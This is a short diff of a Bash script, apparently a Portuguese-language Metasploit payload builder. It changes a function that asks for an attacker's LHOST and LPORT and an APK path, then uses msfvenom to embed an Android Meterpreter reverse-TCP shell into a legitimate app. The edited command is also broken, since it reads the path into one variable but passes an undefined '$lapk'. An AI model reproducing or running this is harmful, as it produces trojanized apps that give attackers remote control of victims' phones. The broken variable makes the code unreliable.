@@ -290,11 +290,11 @@ function embed_apk {
   read LHOST
   echo -n "Insira seu LPORT:"
   read LPORT
-  echo -n "Como chama o apk original? (inclua .apk): "
+  echo -n "Coloque o caminho para o apk(inclua .apk): "
   read napk
   echo -n "Como quer que salve seu apk?(inclua .apk): "
   read nome
-  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -x /home/$SUDO_USER/hall/apks/$napk -o $nome
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -x $lapk -o $nome
 }
 function payload_exe {
   echo -n "Insira seu LHOST:"
